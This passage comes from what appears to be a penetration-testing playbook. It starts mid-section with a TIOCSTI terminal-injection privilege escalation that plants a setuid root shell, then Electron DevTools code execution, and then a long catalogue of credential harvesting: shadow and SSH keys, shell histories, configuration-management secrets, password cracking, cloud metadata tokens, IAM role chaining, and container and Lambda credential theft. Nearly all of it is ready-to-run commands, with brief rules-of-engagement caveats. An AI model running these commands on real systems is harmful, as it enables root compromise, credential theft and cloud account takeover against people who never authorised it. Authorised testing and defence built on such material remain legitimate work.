# Step 1: Check if TIOCSTI is available (disabled in kernel 6.2+ by default)
cat /proc/sys/dev/tty/legacy_tiocsti 2>/dev/null
# 1 = enabled, 0 = disabled
# File doesn't exist → kernel < 6.2, TIOCSTI is available

# Step 2: Identify shared PTY scenario
# After 'su user2' (without -l or -), both users share the same PTY
tty   # shows /dev/pts/X — same as parent

# Step 3: Inject commands via TIOCSTI using Python
python3 -c "
import fcntl, termios, sys
cmd = 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n'
for c in cmd:
    fcntl.ioctl(sys.stdin, termios.TIOCSTI, c.encode())
"
# Command appears in PARENT shell's input queue
# When you exit back to parent shell → command auto-executes

# Step 4: Perl variant
perl -e 'require "sys/ioctl.ph"; foreach $c (split //, "id > /tmp/proof\n") { ioctl(STDIN, &TIOCSTI, $c); }'

# Step 5: C variant
cat > /tmp/inject.c <<'EOF'
#include <sys/ioctl.h>
#include <stdio.h>
int main() {
    char *cmd = "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n";
    while (*cmd) ioctl(0, TIOCSTI, cmd++);
    return 0;
}
EOF
gcc -o /tmp/inject /tmp/inject.c && /tmp/inject
```

#### Living-off-the-land / LOTL variant

```bash
# Python3 or Perl (usually installed) provide the ioctl call
# No external tools needed — the kernel's TIOCSTI is the primitive
# Modern mitigation: kernel 6.2+ has dev.tty.legacy_tiocsti=0 by default
sysctl dev.tty.legacy_tiocsti 2>/dev/null
```

### 4.22c Node.js / Electron / CEF Debugger Exploitation — Cross-Platform CDP Abuse

Extends section 4.11b to cover Electron / CEF processes exposing Chrome DevTools Protocol on debug ports. When another user's Electron app (VS Code, Slack, etc.) runs with `--remote-debugging-port`, connect and execute code as that user.

```bash
# === Linux Detection ===
ps aux | grep -E "\-\-remote-debugging-port|\-\-inspect" | grep -v grep
ss -tlnp | grep -E "9222|9229|9230"  # common debug ports

# Find Electron apps storing debug port in runtime files
find /tmp -name "DevToolsActivePort" 2>/dev/null
find /home/*/.config -name "DevToolsActivePort" 2>/dev/null

# Enumerate discoverable debug targets
curl -s http://127.0.0.1:9222/json

# === Exploitation (same CDP as Node.js --inspect) ===
node -e "
var ws = new (require('ws'))('ws://127.0.0.1:9222/devtools/page/<TARGET_ID>');
ws.on('open', function(){
  ws.send(JSON.stringify({id:1, method:'Runtime.evaluate',
    params:{expression:'require(\"child_process\").execSync(\"id\").toString()'}}));
});
ws.on('message', function(d){ console.log(d.toString()); process.exit(); });
"

# === Windows-specific (cefdebug.exe) ===
# cefdebug.exe --scan
# cefdebug.exe --url ws://127.0.0.1:9222/<PATH> --code "process.mainModule.require('child_process').execSync('whoami')"

# === VS Code Server (common on Linux dev boxes) ===
find /tmp -path "*vscode*" -name "*.json" 2>/dev/null | xargs grep -l "port" 2>/dev/null
curl -s http://127.0.0.1:<PORT>/json 2>/dev/null
```

#### Living-off-the-land / LOTL variant

```bash
# curl for discovery (installed everywhere) + node for WebSocket exploitation
# Without node: python3 with http.client handles HTTP discovery but not WebSocket
# Minimal LOTL: discovery via curl, exploitation requires node or python3 websockets
curl -s http://127.0.0.1:9222/json | grep webSocketDebuggerUrl
```

---

## Phase 5: Post-Exploitation & Credential Harvesting

**Goal:** Extract useful credentials and establish persistence.

### 5.1 Credential Locations

> For hash identification and cracking strategies (hashcat modes, rules, wordlists), see [Password Cracking](password-cracking.md).
```bash
# Shadow file (if readable)
cat /etc/shadow
# Crack with john or hashcat -m 1800 (sha512crypt)

# SSH keys
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
ls -la /home/*/.ssh/
cat /root/.ssh/id_rsa

# History files
cat /home/*/.bash_history
cat /root/.bash_history
cat /home/*/.mysql_history

# Editor / REPL history (often contains admin commands, passwords, file paths)
cat /home/*/.viminfo /root/.viminfo 2>/dev/null          # vim registers, file marks, command/search history
cat /home/*/.lesshst /root/.lesshst 2>/dev/null          # less search history (may reveal grepped secrets)
cat /home/*/.python_history /root/.python_history 2>/dev/null
cat /home/*/.psql_history /root/.psql_history 2>/dev/null
cat /home/*/.sqlite_history /root/.sqlite_history 2>/dev/null
cat /home/*/.dbshell /root/.dbshell 2>/dev/null          # mongo shell history
cat /home/*/.rediscli_history /root/.rediscli_history 2>/dev/null

# DB history — targeted credential grep (passwords appear in ALTER/CREATE/GRANT/CONNECT)
grep -hiE "password|identified by|alter user|create user|grant|connect" /home/*/.psql_history /root/.psql_history 2>/dev/null
grep -hiE "password|identified by|alter user|create user|grant" /home/*/.mysql_history /root/.mysql_history 2>/dev/null
grep -hiE "createUser|updateUser|auth\(" /home/*/.dbshell /root/.dbshell 2>/dev/null

# Vim swap files — may contain unsaved edits of sensitive files
find / -name "*.swp" -o -name "*.swo" 2>/dev/null | xargs ls -la 2>/dev/null
# Recover content from swap: vim -r <FILE>.swp → :w /tmp/recovered

# Config files with passwords
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" 2>/dev/null | head -50
grep -ri "password\|passwd\|pass\|secret\|key\|token" /etc/ /opt/ /var/www/ 2>/dev/null

# Database credentials
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/config.php 2>/dev/null
cat /var/www/html/.env 2>/dev/null
cat /var/www/html/configuration.php 2>/dev/null         # Joomla
cat /var/www/html/sites/default/settings.php 2>/dev/null # Drupal

# Cached credentials
cat /etc/krb5.keytab 2>/dev/null
klist 2>/dev/null

# Mail
cat /var/mail/* 2>/dev/null
cat /var/spool/mail/* 2>/dev/null
```

### 5.1b Cracking Password-Protected Files
```bash
# Found a password-protected file on a share, web server, or user directory?
# Extract the hash, then crack offline with john or hashcat.

# ZIP files
zip2john protected.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
# Or: hashcat -m 13600 zip.hash /usr/share/wordlists/rockyou.txt (PKZIP)
# Or: hashcat -m 13000 zip.hash /usr/share/wordlists/rockyou.txt (RAR5)

# Microsoft Office documents (.docx, .xlsx, .pptx)
/usr/share/john/office2john.py protected.docx > office.hash
john --wordlist=/usr/share/wordlists/rockyou.txt office.hash

# PDF files
/usr/share/john/pdf2john.pl protected.pdf > pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash

# SSH private keys (passphrase-protected)
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash

# KeePass databases (.kdbx)
keepass2john database.kdbx > keepass.hash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
# Or: hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt

# RAR archives
rar2john protected.rar > rar.hash
john --wordlist=/usr/share/wordlists/rockyou.txt rar.hash

# 7z archives
/usr/share/john/7z2john.pl protected.7z > 7z.hash
john --wordlist=/usr/share/wordlists/rockyou.txt 7z.hash

# Apply custom rules for better cracking (mutate wordlist)
hashcat --force wordlist.txt -r /usr/share/hashcat/rules/best64.rule --stdout | sort -u > mutated.txt
john --wordlist=mutated.txt hash.txt
```

### 5.1c Ansible / Configuration Management Credentials
```bash
# --- Ansible ---

# Find Ansible vault files
find / -name "*.vault" -o -name "vault.yml" -o -name "vault.yaml" -o -name "*vault*.yml" 2>/dev/null

# Find Ansible vault password sources
cat ~/.vault_pass 2>/dev/null
env | grep ANSIBLE_VAULT
grep vault_password_file /etc/ansible/ansible.cfg ~/.ansible.cfg 2>/dev/null
# Also check: ansible.cfg in project directories
find / -name "ansible.cfg" -exec grep -l vault_password_file {} \; 2>/dev/null

# Decrypt vault file (requires vault password or password file)
ansible-vault decrypt <VAULT_FILE>
# Or view without modifying:
ansible-vault view <VAULT_FILE>

# Grep playbooks for hardcoded credentials
find / -name "*.yml" -o -name "*.yaml" 2>/dev/null | xargs grep -li "password\|secret\|api_key\|token\|aws_access" 2>/dev/null

# Check group_vars / host_vars (common plaintext credential locations)
find / -path "*/group_vars/*" -o -path "*/host_vars/*" 2>/dev/null | xargs cat 2>/dev/null
find / -path "*/inventory/*" -name "*.yml" 2>/dev/null

# Ansible temp files and history
ls -la ~/.ansible/tmp/ 2>/dev/null
cat ~/.ansible_history 2>/dev/null

# Ansible Tower / AWX credentials
# Database: /etc/tower/conf.d/postgres.py or /etc/tower/settings.py
cat /etc/tower/conf.d/*.py 2>/dev/null
cat /etc/tower/settings.py 2>/dev/null
grep -ri "password\|secret\|token" /etc/tower/ 2>/dev/null

# --- Chef ---

# knife.rb contains Chef server URL and client key path
find / -name "knife.rb" 2>/dev/null | xargs cat 2>/dev/null
# Client PEM keys (used for API authentication)
find / -name "client.pem" -o -name "*.pem" -path "*/chef/*" 2>/dev/null

# Data bags (may contain plaintext or encrypted secrets)
# If knife is configured:
knife data bag list 2>/dev/null
knife data bag show <BAG_NAME> <ITEM_NAME> 2>/dev/null

# Encrypted data bag key
find / -name "encrypted_data_bag_secret" 2>/dev/null
cat /etc/chef/encrypted_data_bag_secret 2>/dev/null

# --- Puppet ---

# Puppet config and credentials
cat /etc/puppetlabs/puppet/puppet.conf 2>/dev/null
cat /etc/puppet/puppet.conf 2>/dev/null

# Hiera secrets (eyaml encrypted values or plaintext)
find / -name "*.eyaml" -o -name "hiera.yaml" -o -name "common.yaml" -path "*/hieradata/*" 2>/dev/null
grep -ri "password\|secret\|token" /etc/puppetlabs/code/ 2>/dev/null

# PuppetDB credentials
cat /etc/puppetlabs/puppetdb/conf.d/database.ini 2>/dev/null

# --- Salt ---

# Salt master config (contains database, API creds)
cat /etc/salt/master 2>/dev/null
cat /etc/salt/master.d/*.conf 2>/dev/null

# Salt pillar data (secrets distributed to minions)
find /srv/pillar -type f 2>/dev/null | xargs grep -li "password\|secret\|token" 2>/dev/null
cat /srv/pillar/*.sls 2>/dev/null

# Salt minion keys and config
cat /etc/salt/minion 2>/dev/null
ls -la /etc/salt/pki/ 2>/dev/null
```

### 5.1d Cloud Metadata Credential Harvesting (Post-Foothold)
```bash
# --- AWS ---

# IMDSv1 (no authentication required)
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# List role name, then fetch temporary credentials:
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
# Returns: AccessKeyId, SecretAccessKey, Token (temporary STS creds)

# IMDSv2 (token-based — required on hardened instances)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>

# AWS environment variables
env | grep -i AWS
# Look for: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN

# AWS credential files
cat ~/.aws/credentials 2>/dev/null
cat ~/.aws/config 2>/dev/null
# Check all users
find /home -name "credentials" -path "*/.aws/*" 2>/dev/null | xargs cat 2>/dev/null
cat /root/.aws/credentials 2>/dev/null

# --- Azure ---

# Azure Instance Metadata Service (IMDS)
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool
# Fetch managed identity OAuth token
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Azure environment variables
env | grep -i AZURE
# Look for: AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, AZURE_TENANT_ID, AZURE_SUBSCRIPTION_ID

# Azure CLI config and tokens
cat ~/.azure/accessTokens.json 2>/dev/null
cat ~/.azure/azureProfile.json 2>/dev/null
find /home -path "*/.azure/*" -name "*.json" 2>/dev/null | xargs cat 2>/dev/null

# --- GCP ---

# GCP metadata server
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/"
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
# Fetch access token for default service account
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# GCP service account keys and CLI config
cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null
cat ~/.config/gcloud/credentials.db 2>/dev/null
find /home -path "*/.config/gcloud/*" 2>/dev/null

# --- DigitalOcean ---

# DigitalOcean metadata
curl -s http://169.254.169.254/metadata/v1/
curl -s http://169.254.169.254/metadata/v1/user-data    # May contain provisioning secrets

# --- General Cloud Credential Hunting ---

# Terraform state files (contain secrets in PLAINTEXT)
find / -name "terraform.tfstate" -o -name "*.tfstate" -o -name "*.tfstate.backup" 2>/dev/null
# Extract secrets from state files
grep -i "password\|secret\|access_key\|private_key\|token" *.tfstate 2>/dev/null

# .env files (often contain API keys and secrets)
find / -name ".env" -o -name ".env.local" -o -name ".env.production" 2>/dev/null | xargs cat 2>/dev/null

# Cloud CLI configs (any provider)
find / -name "config" -path "*/.oci/*" 2>/dev/null       # Oracle Cloud
find / -name "clouds.yaml" 2>/dev/null                    # OpenStack
cat ~/.config/doctl/config.yaml 2>/dev/null               # DigitalOcean CLI

# Kubernetes configs (often contain cloud creds or service account tokens)
cat ~/.kube/config 2>/dev/null
find /home -name "config" -path "*/.kube/*" 2>/dev/null | xargs cat 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
```

---

### 5.1e Cloud Credentials — Post-Theft Chain Enumeration

Once metadata creds (5.1d) or static keys / file-based creds are in hand, the chain doesn't end at `get-caller-identity`. Enumerate the principal's policy graph, walk AssumeRole trusts (including cross-account), and prove privilege via additive markers — never destructive (no `delete*`, no `detach*`, no `put-*-policy` on existing entities).

```bash
# === AWS — load stolen creds and confirm identity ===
export AWS_ACCESS_KEY_ID=<AKIA...>
export AWS_SECRET_ACCESS_KEY=<SECRET>
export AWS_SESSION_TOKEN=<TOKEN>           # only if temporary STS creds (IMDS / AssumeRole / SSO)
aws sts get-caller-identity                 # returns Account, Arn, UserId

# Determine principal type from the Arn:
#   arn:aws:iam::<ACCT>:user/<NAME>            → IAM user (long-term keys)
#   arn:aws:sts::<ACCT>:assumed-role/<R>/<S>   → role session (temporary)
#   arn:aws:sts::<ACCT>:federated-user/<N>     → federated session
```

```bash
# === AWS — enumerate the principal's policy graph (read-only) ===

# Path A — IAM user
aws iam list-attached-user-policies --user-name <USER>
aws iam list-user-policies          --user-name <USER>
aws iam list-groups-for-user        --user-name <USER>
# For each group: attached + inline policies
aws iam list-attached-group-policies --group-name <GROUP>
aws iam list-group-policies          --group-name <GROUP>

# Path B — role session
aws iam list-attached-role-policies --role-name <ROLE>
aws iam list-role-policies          --role-name <ROLE>

# Pull policy documents (default version) for full visibility into Action/Resource/Condition
aws iam get-policy         --policy-arn <POLICY_ARN>
aws iam get-policy-version --policy-arn <POLICY_ARN> --version-id <VID>
aws iam get-user-policy    --user-name <USER> --policy-name <INLINE>
aws iam get-role-policy    --role-name <ROLE> --policy-name <INLINE>

# Map every role you can see — look for trust-policy weaknesses
aws iam list-roles --query 'Roles[].{Name:RoleName,Trust:AssumeRolePolicyDocument}' --output json

# Cross-account trusts — query roles whose AssumeRolePolicyDocument trusts another account
aws iam list-roles \
  --query "Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS && contains(to_string(Principal.AWS), ':root') == \`true\`]].{Role:RoleName,Trust:AssumeRolePolicyDocument}" \
  --output json
# Also look for: wildcard principals, missing ExternalId on third-party trusts, sts:AssumeRole on roles with high-priv attached policies

# Simulate-principal-policy — confirm an action is allowed without firing it
aws iam simulate-principal-policy \
  --policy-source-arn <PRINCIPAL_ARN> \
  --action-names s3:ListAllMyBuckets iam:CreateAccessKey ec2:RunInstances sts:AssumeRole

# Account-wide read-only inventory for policy graph mining
aws iam get-account-authorization-details --output json > /tmp/iam-graph.json
# Feed into PMapper / Cloudsplaining / IAMSpy offline:
#   pmapper graph create
#   cloudsplaining scan --input /tmp/iam-graph.json
```

```bash
# === AWS — AssumeRole chain (lateral / cross-account / privesc via trusted role) ===
aws sts assume-role \
  --role-arn arn:aws:iam::<TARGET_ACCT>:role/<ROLE_ARN> \
  --role-session-name <SESSION_NAME>                       \
  --external-id <EXTERNAL_ID>                              # only if trust policy requires it
# Returns Credentials.{AccessKeyId,SecretAccessKey,SessionToken,Expiration}
# Re-export into a fresh shell or named profile:
aws configure set aws_access_key_id     <NEW_AK> --profile chain-1
aws configure set aws_secret_access_key <NEW_SK> --profile chain-1
aws configure set aws_session_token     <NEW_ST> --profile chain-1
aws sts get-caller-identity --profile chain-1
# Repeat across the trust graph until you reach the target principal
```

```bash
# === AWS — Pacu (offensive cloud framework) ===
pacu
# Inside Pacu:
#   set_keys                            # paste AKIA / SECRET / SESSION_TOKEN
#   run iam__enum_permissions           # walks every iam:Get*/List* the session can call
#   run iam__privesc_scan               # maps current perms to known privesc paths
#   run iam__enum_users_roles_policies_groups
#   # Privesc execution modules are destructive/mutating — DO NOT run iam__backdoor_users_keys
#   # or iam__privesc_scan --offline-aws-iam-dataset against prod without explicit RoE.
# OPSEC: Pacu logs every API call to ~/.local/share/pacu/<session>/ — pull this for the report.
```

```bash
# === AWS — CloudFox (one-shot recon, read-only) ===
# Configure profile first: aws configure --profile <P>
cloudfox aws all-checks --profile <P>
# Or targeted modules (much quieter):
cloudfox aws inventory       --profile <P>     # what exists in the account
cloudfox aws permissions     --profile <P>     # principal -> action map
cloudfox aws role-trusts     --profile <P>     # cross-account / wildcard trusts
cloudfox aws secrets         --profile <P>     # SSM/Secrets Manager surface
cloudfox aws endpoints       --profile <P>     # public endpoints / takeover candidates
# Output lands in ./cloudfox-output/<account>/ as TSV/JSON/Loot — keep for engagement report.
```

```bash
# === Azure — post-token enumeration (after stealing access token / refresh token / cert) ===

# Confirm identity (works for user, SP, or managed-identity token)
az account show
az ad signed-in-user show                                           # if user token

# Subscription / RBAC role assignments for current principal
az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --all
az role assignment list --assignee <USER_OR_SP_OBJECT_ID>           --all
az role definition list --name "Owner"                              # see what each role grants

# Walk subscriptions the token can see
az account list --all --query '[].{Name:name, Id:id, State:state}'

# Key Vault — list and read secrets/keys/certs the principal can access (read-only)
az keyvault list --query '[].{Name:name, RG:resourceGroup}'
az keyvault secret list   --vault-name <KEYVAULT>
az keyvault secret show   --vault-name <KEYVAULT> --name <SECRET>
az keyvault key   list    --vault-name <KEYVAULT>
az keyvault certificate list --vault-name <KEYVAULT>

# Microsoft Graph — directory roles, app registrations, OAuth grants
az rest --method get --uri 'https://graph.microsoft.com/v1.0/directoryRoles'
az rest --method get --uri 'https://graph.microsoft.com/v1.0/me/memberOf'
az rest --method get --uri 'https://graph.microsoft.com/v1.0/applications'
az rest --method get --uri 'https://graph.microsoft.com/v1.0/servicePrincipals'
az rest --method get --uri 'https://graph.microsoft.com/v1.0/oauth2PermissionGrants'

# Storage account keys / SAS — read-only surface check
az storage account list --query '[].{Name:name, RG:resourceGroup}'
az storage account show-connection-string --name <SA> --resource-group <RG>     # only with appropriate role
az storage account keys list              --account-name <SA>                    # Storage Account Key Operator+

# Tooling — full Azure recon (defender-friendly, read-only)
# - ROADtools (roadrecon): MSAL-based directory dump
#     roadrecon auth --device-code; roadrecon gather; roadrecon dump
# - AzureHound (BloodHound CE): cypher-queryable role + RBAC graph
#     azurehound list -u <USER> -p <PW> -t <TENANT> -o azureoutput.json
# - MicroBurst (Get-AzPasswords / Invoke-EnumerateAzureSubDomains)
```

```bash
# === GCP — service-account impersonation chain ===

# Confirm active credentials and project
gcloud auth list
gcloud config list
gcloud projects list

# Enumerate IAM bindings on each service account (looking for iam.serviceAccountTokenCreator
# or iam.serviceAccountUser the current principal holds against another SA)
gcloud iam service-accounts list --project <PROJECT>
gcloud iam service-accounts get-iam-policy <SA_EMAIL> --project <PROJECT>
# Project-level bindings for the current principal:
gcloud projects get-iam-policy <PROJECT> --flatten="bindings[].members" \
  --format='table(bindings.role)' --filter="bindings.members:<USER_OR_SA>"

# Direct impersonation — mint a short-lived access token for the target SA
gcloud auth print-access-token --impersonate-service-account=<SA_EMAIL>

# Or via IAM Credentials API (works programmatically, same trust requirement)
TOKEN=$(gcloud auth print-access-token)
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<SA_EMAIL>:generateAccessToken"

# signBlob / signJwt — sign arbitrary blobs as the target SA (chain into custom auth flows)
gcloud iam service-accounts sign-blob --iam-account=<SA_EMAIL> /tmp/payload /tmp/signed.bin
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d "{\"payload\":\"$(base64 -w0 /tmp/payload)\"}" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<SA_EMAIL>:signBlob"

# Application Default Credentials — print and reuse a bearer for direct API calls
gcloud auth application-default print-access-token
gcloud auth application-default login                           # interactive — for own lab only

# Tooling — GCP recon
# - GCP IAM Privilege Escalation (RhinoSecurityLabs): walks priv-esc paths
# - hayageek/gcp_enum / fwenzel/gcp-iam-collector
# - gcloud asset search-all-iam-policies (org/project asset inventory)
gcloud asset search-all-iam-policies --scope='projects/<PROJECT>' \
  --query='policy.role.permissions:iam.serviceAccountTokenCreator'
```

```bash
# === Additive proof-of-access — never destructive ===
#
# Per offsec-engagement rules: marker location must prove the privilege gained.
# Pick the most-restrictive resource the elevated session can write to.

# AWS — marker S3 object in a bucket only the elevated session can write
aws s3api put-object \
  --bucket <ELEVATED-ONLY-BUCKET> \
  --key marker-engagement-<ENG_ID>-$(date +%s).txt \
  --body <(echo "engagement=<ENG> principal=$(aws sts get-caller-identity --query Arn --output text) ts=$(date -Iseconds)")

# AWS — marker IAM tag on the elevated principal (read-back-able, not destructive to existing tags)
aws iam tag-role --role-name <ROLE> \
  --tags Key=engagement-marker-<ENG_ID>,Value=<UNIX_TS>

# AWS — marker SSM parameter (cheap, account-scoped)
aws ssm put-parameter \
  --name "/marker/engagement/<ENG_ID>/$(date +%s)" \
  --value "principal=$(aws sts get-caller-identity --query Arn --output text)" \
  --type String

# Azure — marker Key Vault secret in a vault only the elevated principal can write
az keyvault secret set \
  --vault-name <ELEVATED-ONLY-KV> \
  --name "marker-engagement-<ENG_ID>" \
  --value "ts=$(date -Iseconds) principal=$(az ad signed-in-user show --query id -o tsv 2>/dev/null)"

# GCP — marker Secret Manager secret created via the impersonated SA
gcloud secrets create marker-engagement-<ENG_ID>-$(date +%s) \
  --replication-policy=automatic --project=<PROJECT> \
  --impersonate-service-account=<SA_EMAIL>
echo "principal=<SA_EMAIL> ts=$(date -Iseconds)" | \
  gcloud secrets versions add marker-engagement-<ENG_ID>-$(date +%s) --data-file=- \
  --impersonate-service-account=<SA_EMAIL>
```

> **OPSEC:** CloudTrail / Azure Activity Log / GCP Cloud Audit Logs record every one of these calls. `iam:Simulate*`, `sts:AssumeRole`, `iamcredentials.generateAccessToken`, and Graph `/me/memberOf` are particularly noisy — coordinate with detection team if the engagement is detection-validation.

> **Hard limit:** never run `aws iam delete*`, `iam detach-*`, `iam put-user-policy` (overwrite), `az role assignment delete`, `gcloud iam service-accounts delete`, or anything that mutates existing policies/roles/SAs. Read the policy graph and ASSUME-only; prove privilege with additive markers above.

---

### 5.1f ECS / Fargate / Lambda / EKS-IRSA / Azure App Service Task Credentials

Container and serverless workloads don't use IMDS — they have their own credential delivery mechanisms. Each one drops short-lived creds into the task at runtime via env vars and HTTP endpoints. Same chain analysis as §5.1e applies once the creds are exported.

```bash
# === ECS / Fargate task role (containerized AWS workload) ===
# Both ECS-on-EC2 and Fargate inject these vars into the task; IMDS is blocked from the container.
env | grep AWS_
# Look for:
#   AWS_CONTAINER_CREDENTIALS_RELATIVE_URI   (ECS task — short URI under 169.254.170.2)
#   AWS_CONTAINER_CREDENTIALS_FULL_URI        (Fargate / EKS — full URL)
#   AWS_CONTAINER_AUTHORIZATION_TOKEN         (Fargate / IRSA — bearer for FULL_URI)
#   ECS_CONTAINER_METADATA_URI                (task metadata — instance/region info, not creds)
#   AWS_DEFAULT_REGION / AWS_REGION

# Fetch creds via the relative URI (ECS task role)
curl -s "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}"
# Returns: {AccessKeyId, SecretAccessKey, Token, Expiration}

# Fetch via FULL_URI (Fargate / external task role)
curl -s "${AWS_CONTAINER_CREDENTIALS_FULL_URI}" \
  -H "Authorization: ${AWS_CONTAINER_AUTHORIZATION_TOKEN}"

# Pull task metadata (region, task ARN, cluster) — useful for blast-radius mapping
curl -s "${ECS_CONTAINER_METADATA_URI}/task" | python3 -m json.tool
# Or v4:
curl -s "${ECS_CONTAINER_METADATA_URI_V4}/task" | python3 -m json.tool

# AWS SDK auto-picks up the env vars — no further export needed:
aws sts get-caller-identity
# Then chain to §5.1e (list-attached-role-policies, simulate-principal-policy, AssumeRole, etc.)
```

```bash
# === Lambda runtime credentials ===
# Lambda injects role creds + a runtime API endpoint into the function environment.
env | grep AWS_
# Key vars present in every Lambda invocation:
#   AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY / AWS_SESSION_TOKEN   (role creds, auto-rotated)
#   AWS_LAMBDA_RUNTIME_API                                          (host:port for runtime API)
#   AWS_LAMBDA_FUNCTION_NAME / AWS_REGION / AWS_LAMBDA_LOG_GROUP_NAME
#   AWS_LAMBDA_FUNCTION_VERSION / _HANDLER

# Confirm and chain:
aws sts get-caller-identity                                         # uses the env creds directly

# Runtime API (if the foothold is the running Lambda — e.g. via deserialization RCE):
# Pull next invocation event (steals customer payload — only do this within RoE)
curl -s "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next"
# Lambda extension API can register a side-channel listener:
curl -s -X POST "http://${AWS_LAMBDA_RUNTIME_API}/2020-01-01/extension/register" \
  -H "Lambda-Extension-Name: <NAME>" -d '{"events":["INVOKE","SHUTDOWN"]}'

# Read function code/config for hardcoded secrets via the role's own perms (if granted):
aws lambda get-function-configuration --function-name "$AWS_LAMBDA_FUNCTION_NAME"          # Environment.Variables in output
aws lambda get-function-configuration --function-name "$AWS_LAMBDA_FUNCTION_NAME" \
    --query 'Environment.Variables' --output json 2>/dev/null                              # extract env block only
aws lambda get-function --function-name "$AWS_LAMBDA_FUNCTION_NAME" \
    --query 'Code.Location' --output text 2>/dev/null                                      # presigned S3 URL → curl to grab code zip
```

```bash
# === EKS Pod Identity / IRSA (IAM Roles for Service Accounts) ===
# IRSA mounts a projected ServiceAccount token + sets web-identity env vars.
env | grep AWS_
# Vars to find:
#   AWS_ROLE_ARN                                (the IAM role the SA assumes)
#   AWS_WEB_IDENTITY_TOKEN_FILE                 (path to the projected JWT)
#   AWS_REGION / AWS_DEFAULT_REGION

ls -la "$AWS_WEB_IDENTITY_TOKEN_FILE"
cat "$AWS_WEB_IDENTITY_TOKEN_FILE"            # JWT — decode header/payload to see audience/sub

# Mint AWS creds with the projected token
aws sts assume-role-with-web-identity \
  --role-arn "$AWS_ROLE_ARN" \
  --role-session-name irsa-chain-$(date +%s) \
  --web-identity-token "file://$AWS_WEB_IDENTITY_TOKEN_FILE"
# Returns Credentials.{AccessKeyId,SecretAccessKey,SessionToken} — export and chain to §5.1e

# Newer EKS Pod Identity (no JWT projection — sidecar agent on 169.254.170.23)
env | grep AWS_CONTAINER_CREDENTIALS_FULL_URI         # set to http://169.254.170.23/v1/credentials
curl -s "$AWS_CONTAINER_CREDENTIALS_FULL_URI" \
  -H "Authorization: $AWS_CONTAINER_AUTHORIZATION_TOKEN"

# Cluster context — the ServiceAccount token also lets you talk to the K8s API
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)/pods"
# Then: kubectl auth can-i --list  -- maps RBAC for the SA
```

```bash
# === Azure App Service / Functions — Managed Identity (MSI) variant ===
# App Service injects IDENTITY_ENDPOINT + IDENTITY_HEADER (the secret), not raw creds.
env | grep -iE "IDENTITY_|MSI_"
# Vars to find:
#   IDENTITY_ENDPOINT      (URL on 127.0.0.1 unique to the app)
#   IDENTITY_HEADER        (secret bearer that gates the endpoint)
#   MSI_ENDPOINT / MSI_SECRET   (legacy Functions vars — same idea)

# Fetch a token for ARM (or any Azure resource) using system-assigned identity
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "${IDENTITY_ENDPOINT}?resource=https://management.azure.com/&api-version=2019-08-01"
# Returns: {access_token, expires_on, resource, token_type, client_id}

# For user-assigned identity, add &client_id=<UAI_CLIENT_ID>
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "${IDENTITY_ENDPOINT}?resource=https://vault.azure.net&api-version=2019-08-01&client_id=<UAI_CLIENT_ID>"

# Use the token directly against ARM / Graph / Key Vault (chain to §5.1e Azure block)
TOKEN=$(curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "${IDENTITY_ENDPOINT}?resource=https://management.azure.com/&api-version=2019-08-01" | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

```bash
